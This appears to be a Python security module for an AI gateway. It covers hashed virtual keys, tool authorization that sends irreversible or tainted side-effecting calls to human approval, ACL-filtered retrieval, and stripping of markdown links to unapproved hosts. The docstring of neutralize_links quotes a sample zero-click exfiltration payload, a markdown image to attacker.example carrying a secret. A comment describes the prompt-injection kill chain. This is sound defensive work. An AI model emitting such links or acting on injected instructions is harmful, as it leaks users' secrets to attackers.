"""Identity, tool authorization, retrieval ACLs and output handling.

The rule behind every class here: the model proposes, deterministic code disposes.
"""

from __future__ import annotations

import enum
import hashlib
import hmac
import json
import re
import secrets
from collections.abc import Callable
from dataclasses import dataclass, field
from urllib.parse import urlparse

from .types import ErrorKind, GatewayError, Principal

# --- Virtual keys ---------------------------------------------------------------------


class KeyStore:
    """Gateway-issued keys. Provider keys never leave the gateway; callers get these instead.

    Only a hash is stored, so a database leak doesn't leak working keys. The visible prefix
    lets humans and secret scanners recognise a key without the store being able to show it.
    """

    PREFIX = "aigw_live_"

    def __init__(self, pepper: bytes):
        self._pepper = pepper  # from a secret manager, not from the same DB as the hashes
        self._by_hash: dict[str, Principal] = {}

    def _hash(self, key: str) -> str:
        return hmac.new(self._pepper, key.encode(), hashlib.sha256).hexdigest()

    def issue(self, tenant: str, user: str | None, scopes: set[str]) -> tuple[str, Principal]:
        key = self.PREFIX + secrets.token_urlsafe(24)
        p = Principal(tenant=tenant, key_id=key[:16], user=user, scopes=frozenset(scopes))
        self._by_hash[self._hash(key)] = p
        return key, p  # the only time the plaintext exists

    def authenticate(self, key: str | None) -> Principal:
        if not key or not key.startswith(self.PREFIX):
            raise GatewayError(ErrorKind.AUTH, "missing or malformed key")
        p = self._by_hash.get(self._hash(key))
        if p is None:
            raise GatewayError(ErrorKind.AUTH, "invalid key")
        return p

    def revoke(self, key: str) -> None:
        self._by_hash.pop(self._hash(key), None)


# --- Tool authorization ---------------------------------------------------------------


class Effect(enum.StrEnum):
    READ = "read"
    WRITE = "write"  # reversible state change
    IRREVERSIBLE = "irreversible"  # money moves, emails leave, rows are deleted
    EGRESS = "egress"  # data leaves the trust boundary (HTTP fetch, webhook, email)


class ToolDecision(enum.StrEnum):
    ALLOW = "allow"
    DENY = "deny"
    APPROVE = "needs_human_approval"


@dataclass(frozen=True)
class ToolSpec:
    name: str
    effect: Effect
    scope: str  # the caller must hold this scope; the model can't grant it
    validate: Callable[[dict, Principal], str | None] = lambda args, p: None  # -> error
    max_per_request: int = 5


@dataclass
class ToolCall:
    name: str
    args: dict


@dataclass
class AgentContext:
    """Per-request state the policy reasons about. `tainted` = untrusted text is in context."""

    principal: Principal
    tainted: bool = False
    taint_sources: list[str] = field(default_factory=list)
    calls: dict[str, int] = field(default_factory=dict)

    def ingest(self, source: str, trusted: bool) -> None:
        if not trusted:
            self.tainted = True
            self.taint_sources.append(source)


class ToolPolicy:
    def __init__(self, tools: list[ToolSpec]):
        self.tools = {t.name: t for t in tools}

    def authorize(self, call: ToolCall, ctx: AgentContext) -> tuple[ToolDecision, str]:
        spec = self.tools.get(call.name)
        if spec is None:
            return ToolDecision.DENY, "unknown tool"  # hallucinated or injected tool name
        if spec.scope not in ctx.principal.scopes:
            return ToolDecision.DENY, f"caller lacks scope {spec.scope!r}"
        if (err := spec.validate(call.args, ctx.principal)) is not None:
            return ToolDecision.DENY, err
        if ctx.calls.get(call.name, 0) >= spec.max_per_request:
            return ToolDecision.DENY, "per-request call limit"
        if spec.effect == Effect.IRREVERSIBLE:
            return ToolDecision.APPROVE, "irreversible effect"
        if ctx.tainted and spec.effect in (Effect.WRITE, Effect.EGRESS):
            # Untrusted input + side effects is the prompt-injection kill chain. Break it here.
            return ToolDecision.APPROVE, f"untrusted content in context ({', '.join(ctx.taint_sources)})"
        ctx.calls[call.name] = ctx.calls.get(call.name, 0) + 1
        return ToolDecision.ALLOW, "ok"


def idempotency_key(conversation_id: str, step: int, call: ToolCall) -> str:
    """Same conversation + step + call -> same key, so a retried tool call is deduplicated.

    Derived, never random: a fresh UUID per attempt defeats the point. The TOOL (not the
    agent loop) stores keys it has executed and returns the stored result on a repeat.
    """
    canonical = json.dumps({"c": conversation_id, "s": step, "t": call.name, "a": call.args},
                           sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(canonical.encode()).hexdigest()[:32]


# --- Retrieval ACLs ---------------------------------------------------------------------


@dataclass(frozen=True)
class Document:
    id: str
    tenant: str
    groups: frozenset[str]  # who may read it, copied from the source system at index time
    text: str


class Retriever:
    """Filter by ACL *before* ranking and before anything reaches the model.

    The model can't be trusted to keep a secret it has read. "We tell it not to mention
    documents the user can't see" is not access control.
    """

    def __init__(self, docs: list[Document]):
        self.docs = docs

    def search(self, query: str, principal: Principal, user_groups: set[str], k: int = 3) -> list[Document]:
        visible = [d for d in self.docs
                   if d.tenant == principal.tenant and d.groups & user_groups]
        words = set(query.lower().split())
        scored = sorted(visible, key=lambda d: -len(words & set(d.text.lower().split())))
        return scored[:k]


# --- Output handling --------------------------------------------------------------------

MD_LINK = re.compile(r"(!?)\[([^\]]*)\]\(([^)\s]+)[^)]*\)")


def neutralize_links(markdown: str, allowed_hosts: set[str]) -> tuple[str, list[str]]:
    """Drop markdown images/links to hosts you don't control.

    An image the client auto-renders is a zero-click exfiltration channel:
    ![x](https://attacker.example/p?d=<secret the model just read>).
    """
    removed: list[str] = []

    def repl(m: re.Match) -> str:
        bang, label, url = m.groups()
        host = urlparse(url).hostname or ""
        if host in allowed_hosts:
            return m.group(0)
        removed.append(url)
        return "" if bang else label

    return MD_LINK.sub(repl, markdown), removed
